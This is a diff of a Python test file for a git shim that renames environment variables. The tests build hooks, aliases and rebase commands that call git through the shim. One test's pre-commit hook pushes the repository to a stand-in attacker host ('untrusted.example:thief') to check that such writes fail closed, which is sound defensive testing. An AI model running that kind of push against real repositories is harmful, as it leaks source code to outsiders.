@@ -9,7 +9,7 @@ import sys
 from pathlib import Path
 
 _SRC = Path(__file__).resolve().parents[2] / "src"
-_SENTINEL = "__UV_SHIM_GIT_CONTINUATION"
+_SENTINEL = "__GIT_SHIM_CONTINUATION"
 
 
 def _shim_env(real_git: str, shim_bin: Path, **overrides: str) -> dict[str, str]:
@@ -17,9 +17,9 @@ def _shim_env(real_git: str, shim_bin: Path, **overrides: str) -> dict[str, str]
     existing = env.get("PYTHONPATH")
     env["PYTHONPATH"] = str(_SRC) + (os.pathsep + existing if existing else "")
     env["PATH"] = str(shim_bin) + os.pathsep + env.get("PATH", "")
-    env["UV_SHIM_GIT_REAL_PATH"] = real_git
-    env["UV_SHIM_GIT_TEST_PATH"] = str(shim_bin).replace("\\", "/")
-    env["UV_SHIM_GIT_MODE"] = "agent"
+    env["GIT_SHIM_REAL_PATH"] = real_git
+    env["GIT_SHIM_TEST_PATH"] = str(shim_bin).replace("\\", "/")
+    env["GIT_SHIM_MODE"] = "agent"
     env.update(overrides)
     return env
 
@@ -47,7 +47,7 @@ def _install_git_shim(bin_dir: Path, entry_log: Path) -> None:
 
 
 def _run_git(repo, env: dict[str, str], *args: str) -> subprocess.CompletedProcess[str]:
-    launcher = Path(env["UV_SHIM_GIT_TEST_PATH"]) / ("git.cmd" if os.name == "nt" else "git")
+    launcher = Path(env["GIT_SHIM_TEST_PATH"]) / ("git.cmd" if os.name == "nt" else "git")
     return subprocess.run(  # noqa: S603
         [str(launcher), *args],
         cwd=repo.path,
@@ -87,7 +87,7 @@ def test_pre_commit_hook_git_call_is_a_single_continuation(
         "#!/bin/sh\n"
         f'test "${_SENTINEL}" = 1 || exit 91\n'
         f"printf 'malformed = [' > '{str(config_path).replace('\\', '/')}'\n"
-        '"$UV_SHIM_GIT_TEST_PATH/git" diff --cached --quiet\n'
+        '"$GIT_SHIM_TEST_PATH/git" diff --cached --quiet\n'
         f"printf ran >> '{str(hook_count).replace('\\', '/')}'\n",
         encoding="utf-8",
     )
@@ -115,7 +115,7 @@ def test_shell_alias_git_call_completes_once_as_a_continuation(
     alias_count = tmp_path / "alias-count"
     repo.config(
         "alias.nested-status",
-        f'!"$UV_SHIM_GIT_TEST_PATH/git" status --porcelain '
+        f'!"$GIT_SHIM_TEST_PATH/git" status --porcelain '
         f"&& printf ran >> '{str(alias_count).replace('\\', '/')}'",
     )
 
@@ -149,7 +149,7 @@ def test_submodule_update_completes_with_shim_first_on_path(
     update_count = tmp_path / "submodule-update-count"
     parent.config(
         "submodule.deps/child.update",
-        '!f() { "$UV_SHIM_GIT_TEST_PATH/git" checkout "$1" '
+        '!f() { "$GIT_SHIM_TEST_PATH/git" checkout "$1" '
         f"&& printf ran >> '{str(update_count).replace('\\', '/')}'; }}; f",
     )
 
@@ -188,7 +188,7 @@ def test_rebase_exec_git_call_completes_once_as_a_continuation(
     _install_git_shim(shim_bin, entry_log)
     exec_count = tmp_path / "exec-count"
     command = (
-        '"$UV_SHIM_GIT_TEST_PATH/git" status --porcelain '
+        '"$GIT_SHIM_TEST_PATH/git" status --porcelain '
         f"&& printf ran >> '{str(exec_count).replace('\\', '/')}'"
     )
 
@@ -219,7 +219,7 @@ def test_nested_write_to_unconfigured_host_still_fails_closed(
     hook = repo.git_dir / "hooks" / "pre-commit"
     hook.write_text(
         "#!/bin/sh\n"
-        '"$UV_SHIM_GIT_TEST_PATH/git" '
+        '"$GIT_SHIM_TEST_PATH/git" '
         "push git@untrusted.example:thief/repo.git HEAD:main\n",
         encoding="utf-8",
     )
